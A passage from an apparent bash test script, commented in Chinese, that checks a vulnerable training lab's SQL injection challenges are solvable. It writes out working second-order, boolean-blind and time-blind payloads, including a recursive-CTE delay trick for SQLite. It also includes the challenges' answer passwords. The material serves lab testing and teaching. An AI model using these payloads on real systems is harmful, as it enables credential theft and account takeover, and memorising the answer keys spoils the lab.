expect_has "带 payload 的用户名能正常注册并登录（注册是参数化的）" "已登录" "$body"
expect_unsolved "sqli/second_order" "光是登录还不算通关"

body=$(page -b "$JAR" -X POST "$BASE/v/sqli/second_order/password" \
  --data-urlencode "new_password=PWNED-BY-SECOND-ORDER")
expect_has "改密码改掉的是 admin 那一行" "admin 的密码被改掉了" "$body"
expect_solved "sqli/second_order" "check() 确认 admin 的密码变了"

body=$(page -b "$JAR" -X POST "$BASE/v/sqli/second_order/login" \
  --data-urlencode "username=admin" --data-urlencode "password=PWNED-BY-SECOND-ORDER")
expect_has "而且真的能用 admin + 新密码登进去" "已登录：admin" "$body"
rm -f "$JAR"

# ---- sqli/boolean_blind：只剩一个布尔值
expect_unsolved "sqli/boolean_blind" "动手之前 check() 说未通关"

body=$(page -X POST "$BASE/v/sqli/boolean_blind/check" \
  --data-urlencode "code=WELCOME10")
expect_has "真的券码回「有效」" "这个券有效" "$body"

body=$(page -X POST "$BASE/v/sqli/boolean_blind/check" \
  --data-urlencode "code=NOPE")
expect_has "假券码回「无效」" "无效的券码" "$body"
expect_unsolved "sqli/boolean_blind" "只会试真假不算通关"

# 信道：一个"无效"的输入，靠注入把条件改成真
body=$(page -X POST "$BASE/v/sqli/boolean_blind/check" \
  --data-urlencode "code=' OR 1=1 -- ")
expect_has "布尔信道建立：注入让页面回了「有效」" "这个券有效" "$body"

# 用布尔信道问一位（真、假各问一次，证明它是一个开关）
body=$(page -X POST "$BASE/v/sqli/boolean_blind/check" \
  --data-urlencode "code=' OR (SELECT 1 FROM users WHERE username='admin' AND substr(password,1,1)='v') -- ")
expect_has "猜对了那位字符 → 「有效」" "这个券有效" "$body"
body=$(page -X POST "$BASE/v/sqli/boolean_blind/check" \
  --data-urlencode "code=' OR (SELECT 1 FROM users WHERE username='admin' AND substr(password,1,1)='z') -- ")
expect_has "猜错了 → 「无效」（真假可区分）" "无效的券码" "$body"
expect_unsolved "sqli/boolean_blind" "信道通了但还没把密码取出来"

# 二分：用 > 代替 =
body=$(page -X POST "$BASE/v/sqli/boolean_blind/check" \
  --data-urlencode "code=' OR (SELECT substr(password,1,1) FROM users WHERE username='admin') > 'm' -- ")
expect_has "二分：第一位 v 比 m 大 → 「有效」" "这个券有效" "$body"

curl -s -o /dev/null -X POST "$BASE/v/sqli/boolean_blind/check" \
  --data-urlencode "guess=wrong1"
expect_unsolved "sqli/boolean_blind" "猜错密码不算"

curl -s -o /dev/null -X POST "$BASE/v/sqli/boolean_blind/check" \
  --data-urlencode "guess=v9k2mq"
expect_solved "sqli/boolean_blind" "check() 确认两个目标都达成"

# ---- sqli/sleepless_time_blind：数据库没有 SLEEP，自己造延迟
expect_unsolved "sqli/sleepless_time_blind" "动手之前 check() 说未通关"

t_normal=$(curl -s -o /dev/null -w '%{time_total}' -X POST \
  "$BASE/v/sqli/sleepless_time_blind/" --data-urlencode "ticket_no=T-1001")
expect_lt "普通查询很快返回" "$t_normal" "1.0"

# 递归 CTE 当 CPU 燃烧器（Sqlite 没有 SLEEP）。数字是校准过的：
# 600 万次约 0.7 秒，所以 2500 万次约 3 秒。
SPIN="SELECT count(*) FROM (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x < 25000000) SELECT x FROM c)"
t_slow=$(curl -s -o /dev/null -w '%{time_total}' -X POST \
  "$BASE/v/sqli/sleepless_time_blind/" \
  --data-urlencode "ticket_no=' OR ($SPIN) -- ")
expect_ge "递归 CTE 造出了可测量的延迟" "$t_slow" "2.0"

# 条件式：证明它是一个真正的开关（真慢假快），不是单纯在拖时间
t_true=$(curl -s -o /dev/null -w '%{time_total}' -X POST \
  "$BASE/v/sqli/sleepless_time_blind/" \
  --data-urlencode "ticket_no=' OR CASE WHEN (SELECT substr(password,1,1) FROM users WHERE username='admin')='q' THEN ($SPIN) ELSE 0 END -- ")
t_false=$(curl -s -o /dev/null -w '%{time_total}' -X POST \
  "$BASE/v/sqli/sleepless_time_blind/" \
  --data-urlencode "ticket_no=' OR CASE WHEN (SELECT substr(password,1,1) FROM users WHERE username='admin')='z' THEN ($SPIN) ELSE 0 END -- ")
expect_ge "条件为真时慢（猜对）" "$t_true" "2.0"
expect_lt "条件为假时快（猜错）—— 所以它是个开关" "$t_false" "1.0"

body=$(page -X POST "$BASE/v/sqli/sleepless_time_blind/" \
  --data-urlencode "ticket_no=' OR ($SPIN) -- ")
expect_has "页面本身永远说同一句话" "查询完成" "$body"
expect_unsolved "sqli/sleepless_time_blind" "建立了信道还没提交密码"

curl -s -o /dev/null -X POST "$BASE/v/sqli/sleepless_time_blind/" \
  --data-urlencode "guess=wrong1"
expect_unsolved "sqli/sleepless_time_blind" "猜错密码不算"

curl -s -o /dev/null -X POST "$BASE/v/sqli/sleepless_time_blind/" \
  --data-urlencode "guess=q7m4xd"
expect_solved "sqli/sleepless_time_blind" "check() 确认两个目标都达成"

step "结果"
printf '  通过 %d 项，失败 %d 项\n' "$PASS" "$FAIL"
if [ "$FAIL" != "0" ]; then
  printf '\n靶场日志尾部：\n'
  tail -40 "$LOG"
  exit 1
fi
exit 0
